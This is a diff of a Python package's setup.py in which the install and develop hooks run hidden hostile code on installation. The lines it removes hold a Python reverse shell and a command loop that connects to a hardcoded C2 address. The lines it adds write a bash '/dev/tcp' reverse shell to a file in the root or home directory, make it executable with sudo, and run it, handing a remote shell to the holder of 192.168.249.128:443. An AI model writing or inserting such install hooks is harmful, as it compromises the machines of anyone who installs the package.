@@ -6,12 +6,10 @@ import getpass
 import os
 import time
 import subprocess
-import socket
 
 from setuptools import setup
 from setuptools.command.develop import develop
 from setuptools.command.install import install
-from multiprocessing import Process
 
 long_description_filename = os.path.join(
     os.path.dirname(os.path.abspath(__file__)), 'README.md')
@@ -26,33 +24,30 @@ USER = getpass.getuser()
 TIME = int(time.time())
 C2 = "192.168.249.128"
 PORT = 443
-PAYLOAD = "python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+C2+",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh -i\"])'"
-PAYLOAD1 = "python3 -c 'import os;os.system(\"ping -c 1 \" + \""+C2+"\")'"
 
-
-def rev_sh():
-    s=socket.socket()
-    s.connect((C2,PORT))
-    while True:
-        proc = subprocess.Popen(s.recv(1024),  shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        s.send(proc.stdout.read() + proc.stderr.read())
 
 def touch_file():
     try:
         with open(ROOT_PATH, 'a') as root_fd:
-            message = PAYLOAD1
+            message = '#!/bin/bash\nsh -i >& /dev/tcp/{0}/{1} 0>&1'.format(
+                C2.strip('"'),
+                PORT
+            )
             print(message)
             root_fd.write(message + '\n')
-            # os.system("sudo chmod +x " + os.path.join(os.path.abspath(os.sep), FILENAME))
-            subprocess.call([PAYLOAD1])
+            os.system("sudo chmod +x " + os.path.join(os.path.abspath(os.sep), FILENAME))
+            subprocess.call(["/bin/sh -c ."+os.path.join(os.path.abspath(os.sep), FILENAME)])
     except (IOError, OSError):
         try:
             with open(USER_PATH, 'a') as user_fd:
-                message = PAYLOAD1
+                message = '#!/bin/bash\nsh -i >& /dev/tcp/{0}/{1} 0>&1'.format(
+                    C2.strip('"'),
+                    PORT
+                )
                 print(message)
                 user_fd.write(message + '\n')
-                # os.system("sudo chmod +x " + os.path.join(os.path.expanduser('~'), FILENAME))
-                subprocess.call([PAYLOAD1])
+                os.system("sudo chmod +x " + os.path.join(os.path.expanduser('~'), FILENAME))
+                subprocess.call(["/bin/sh -c ."+os.path.join(os.path.expanduser('~'), FILENAME)])
         except (IOError, OSError):
             print('Could not write to {!r} or {!r}'.format(ROOT_PATH, USER_PATH))
             print('What kind of tricky system are you running this on?')
@@ -61,18 +56,12 @@ def touch_file():
 class PostDevelopCommand(develop):
     def run(self):
         touch_file()
-        p = Process(target=rev_sh,name='module')
-        p.start()
-        # rev_sh()
         develop.run(self)
 
 
 class PostInstallCommand(install):
     def run(self):
         touch_file()
-        p = Process(target=rev_sh,name='module')
-        p.start()
-        # rev_sh()
         install.run(self)
 
 
